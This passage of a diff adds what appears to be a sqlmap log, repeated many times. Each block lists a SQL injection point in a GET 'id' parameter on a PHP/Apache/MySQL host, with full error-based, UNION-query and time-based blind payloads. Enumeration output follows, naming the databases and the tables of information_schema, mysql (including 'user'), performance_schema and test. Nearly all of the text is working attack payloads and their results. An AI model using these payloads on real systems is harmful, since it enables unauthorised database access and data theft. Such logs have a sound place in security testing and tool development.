+| setup_timers                                 |
+| threads                                      |
++----------------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: mysql
+[24 tables]
++---------------------------+
+| user                      |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: performance_schema
+[17 tables]
++----------------------------------------------+
+| cond_instances                               |
+| events_waits_current                         |
+| events_waits_history                         |
+| events_waits_history_long                    |
+| events_waits_summary_by_instance             |
+| events_waits_summary_by_thread_by_event_name |
+| events_waits_summary_global_by_event_name    |
+| file_instances                               |
+| file_summary_by_event_name                   |
+| file_summary_by_instance                     |
+| mutex_instances                              |
+| performance_timers                           |
+| rwlock_instances                             |
+| setup_consumers                              |
+| setup_instruments                            |
+| setup_timers                                 |
+| threads                                      |
++----------------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
